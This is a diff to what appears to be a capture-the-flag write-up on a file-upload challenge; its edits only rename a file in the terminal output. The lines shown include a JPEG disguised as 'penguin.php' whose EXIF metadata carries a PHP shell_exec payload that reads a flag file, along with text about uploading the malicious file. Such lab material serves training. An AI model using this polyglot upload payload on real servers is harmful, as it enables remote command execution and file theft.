@@ -63,7 +63,7 @@ Now, inject a super duper simple PHP shell execution payload into the `penguin.p
 ┌──(kali㉿kali)-[~/finals/web/payloads]
 └─$ exiftool penguin.php                                    
 ExifTool Version Number         : 12.57
-File Name                       : d.php
+File Name                       : penguin.php
 Directory                       : .
 File Size                       : 3.5 kB
 File Modification Date/Time     : 2023:08:15 09:57:23-04:00
@@ -100,8 +100,8 @@ We can check the file type to see if our document name has added.
 
 ```
 ┌──(kali㉿kali)-[~/finals/web/payloads]
-└─$ file d.php 
-d.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, name=<?php echo shell_exec('cat /home/flag.txt');?>, xresolution=122, yresolution=130, resolutionunit=1], baseline, precision 8, 183x276, components 3
+└─$ file penguin.php 
+penguin.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, name=<?php echo shell_exec('cat /home/flag.txt');?>, xresolution=122, yresolution=130, resolutionunit=1], baseline, precision 8, 183x276, components 3
 ```
 
 Upload the malicious file and we got a hit! The flag is then revealed.
